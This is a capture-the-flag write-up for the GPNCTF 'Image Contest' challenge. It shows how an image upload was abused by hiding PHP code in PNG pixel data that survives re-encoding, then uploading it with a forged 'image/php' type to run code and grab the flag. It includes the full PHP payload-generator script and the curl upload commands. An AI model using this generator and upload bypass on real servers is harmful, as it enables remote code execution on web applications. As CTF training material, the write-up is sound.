# Image Contest

## Description

You have technicians here, making noise, they are not artists because no one has submitted any art yet. Which is exactly what you need to do: submit a banger image and win the flag. Sadly, the image contest doesn't end until the end of the CTF, so you will need to expedite the process.

## Solution

![Image Contest.png](/assets/ctf/gpnctf/image-contest.png)

We are dropped into **Image Contest**, our username is **Suspicious**, ID 7308 and we can't logout. +No cookies.

We are allowed to upload image files on server.

![Image Contest-1.png](/assets/ctf/gpnctf/image-contest-1.png)

There's very small changes to the uploaded file and original file; Most probably some metadata got stripped off, but that's about it.
```bash
└─$ md5sum 7308.png ~/Pictures/kraken.png
b401d836e82b7590053a2d5e33413bf0  7308.png
ba3e9e835bd7a2536a0f056c38413fa3  /home/woyag/Pictures/kraken.png

└─$ stat 7308.png ~/Pictures/kraken.png
  File: 7308.png
  Size: 3613            Blocks: 8          IO Block: 4096   regular file
Device: 0,55    Inode: 162         Links: 1
Access: (0770/-rwxrwx---)  Uid: (    0/    root)   Gid: (  138/  vboxsf)
Access: 2025-06-20 13:13:43.316002300 -0400
Modify: 2025-06-20 13:13:34.010198800 -0400
Change: 2025-06-20 13:13:34.010198800 -0400
 Birth: -
  File: /home/woyag/Pictures/kraken.png
  Size: 4822            Blocks: 16         IO Block: 4096   regular file
Device: 8,1     Inode: 1184882     Links: 1
Access: (0770/-rwxrwx---)  Uid: ( 1001/   woyag)   Gid: (  138/  vboxsf)
Access: 2025-06-20 13:09:39.378714670 -0400
Modify: 2024-05-11 17:53:19.374661100 -0400
Change: 2024-05-11 17:53:29.435679368 -0400
 Birth: 2024-05-11 17:53:29.435679368 -0400

└─$ exiftool 7308.png
ExifTool Version Number         : 12.76
File Name                       : 7308.png
Directory                       : .
File Size                       : 3.6 kB
File Modification Date/Time     : 2025:06:20 13:13:34-04:00
File Access Date/Time           : 2025:06:20 13:13:43-04:00
File Inode Change Date/Time     : 2025:06:20 13:13:34-04:00
File Permissions                : -rwxrwx---
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 512
Image Height                    : 512
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 3780
Pixels Per Unit Y               : 3780
Pixel Units                     : meters
Image Size                      : 512x512
Megapixels                      : 0.262

└─$ exiftool ~/Pictures/kraken.png
ExifTool Version Number         : 12.76
File Name                       : kraken.png
Directory                       : /home/woyag/Pictures
File Size                       : 4.8 kB
File Modification Date/Time     : 2024:05:11 17:53:19-04:00
File Access Date/Time           : 2025:06:20 13:09:39-04:00
File Inode Change Date/Time     : 2024:05:11 17:53:29-04:00
File Permissions                : -rwxrwx---
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 512
Image Height                    : 512
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
Software                        : www.inkscape.org
Image Size                      : 512x512
Megapixels                      : 0.262
```

File upload seems to be restricted to only single file. If you upload image A, then upload B, A is deleted and B stays; Name stays the same.

After some messing around we get our first error message.

![Image Contest-2.png](/assets/ctf/gpnctf/image-contest-2.png)

If we attempt to upload `jpeg` we get different output with a comment:
```bash
└─$ file 7308.jpeg
7308.jpeg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality", baseline, precision 8, 512x512, components 3

└─$ file 7308.png
7308.png: PNG image data, 512 x 512, 8-bit/color RGB, non-interlaced
```

[File upload tricks and checklist](https://www.onsecurity.io/blog/file-upload-checklist/): 

![Image Contest-3.png](/assets/ctf/gpnctf/image-contest-3.png)

Looks like JPEG is a dead end.

As always synacktiv with bombarding PHP posts... [Persistent PHP payloads in PNGs: How to inject PHP code in an image – and keep it there !](https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)

I managed to solve challenge after the CTF ended. (My laptop managed to fry itself, twice. Now that it's on life support I scrambled help from Discord and managed to get challenge, fun)

Trickiest part was identifying that `image/TYPE` saves the files as that extension and there's no check against PHP 😵

Anyway here's the whole thing:
```php
<?php

if(count($argv) != 3) exit("Usage $argv[0] <PHP payload> <Output file>");

$_payload = $argv[1];
$output = $argv[2];

while (strlen($_payload) % 3 != 0) { $_payload.=" "; }

$_pay_len=strlen($_payload);
if ($_pay_len > 256*3){
    echo "FATAL: The payload is too long. Exiting...";
    exit();
}
if($_pay_len %3 != 0){
    echo "FATAL: The payload isn't divisible by 3. Exiting...";
    exit();
}

$width=$_pay_len/3;
$height=20;
$im = imagecreate($width, $height);

$_hex=unpack('H*',$_payload);
$_chunks=str_split($_hex[1], 6);

for($i=0; $i < count($_chunks); $i++){
    $_color_chunks=str_split($_chunks[$i], 2);
    $color=imagecolorallocate($im, hexdec($_color_chunks[0]), hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));
    imagesetpixel($im,$i,1,$color);
}

imagepng($im,$output); 
```

```bash
└─$ php gen.php '<?php echo phpinfo(); ?>' usb.php
└─$ curl 'https://goldencreek-of-cosmically-success.gpn23.ctf.kitctf.de' -F 'file-upload=@usb.jpg;type=image/php' -F 'upload=1' -s | grep 'unified message section' -A10 | html2markdown
### Success

File uploaded successfully.

└─$ curl -so- https://goldencreek-of-cosmically-success.gpn23.ctf.kitctf.de/uploads/7308.php | grep -aPo 'GPNCTF\{[^<]*\}'
GPNCTF{WHA7_A_8AnGEr_1_DEC14re_yoU_WINNeR!}
GPNCTF{WHA7_A_8AnGEr_1_DEC14re_yoU_WINNeR!}
```

::: tip Flag
`GPNCTF{WHA7_A_8AnGEr_1_DEC14re_yoU_WINNeR!}`
:::

